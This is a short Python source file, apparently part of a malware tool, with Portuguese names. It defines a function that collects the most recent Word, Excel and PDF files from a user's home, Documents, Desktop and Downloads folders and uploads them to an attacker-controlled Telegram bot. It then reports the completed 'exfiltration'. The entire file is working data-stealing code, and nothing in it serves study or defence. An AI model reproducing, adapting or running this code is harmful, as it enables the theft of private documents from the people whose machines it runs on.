import os
import requests
from glob import glob
from time import time

def localizar_arquivos(caminhos, extensoes, limite=15, tamanho_max=5*1024*1024):
    arquivos_encontrados = []

    for base in caminhos:
        for ext in extensoes:
            for arquivo in glob(f"{base}/**/*{ext}", recursive=True):
                try:
                    if os.path.isfile(arquivo) and os.path.getsize(arquivo) < tamanho_max:
                        arquivos_encontrados.append(arquivo)
                except:
                    continue

    # Ordenar por data de modificação (mais recentes primeiro)
    arquivos_encontrados.sort(key=lambda x: os.path.getmtime(x), reverse=True)
    return arquivos_encontrados[:limite]

def exfiltrar(token, chat_id):
    user = os.path.expanduser("~")
    caminhos = [
        user,
        os.path.join(user, "Documents"),
        os.path.join(user, "Desktop"),
        os.path.join(user, "Downloads")
    ]
    extensoes = [".doc", ".docx", ".pdf", ".xls", ".xlsx"]
    arquivos = localizar_arquivos(caminhos, extensoes)

    enviados = 0
    for arq in arquivos:
        try:
            with open(arq, 'rb') as f:
                nome = os.path.basename(arq)
                files = {'document': (nome, f)}
                resp = requests.post(
                    f"https://api.telegram.org/bot{token}/sendDocument",
                    data={'chat_id': chat_id, 'caption': f"📄 {nome}"},
                    files=files
                )
                if resp.status_code == 200:
                    enviados += 1
        except Exception as e:
            continue

    return f"📤 Exfiltração completa: {enviados}/{len(arquivos)} arquivos enviados."
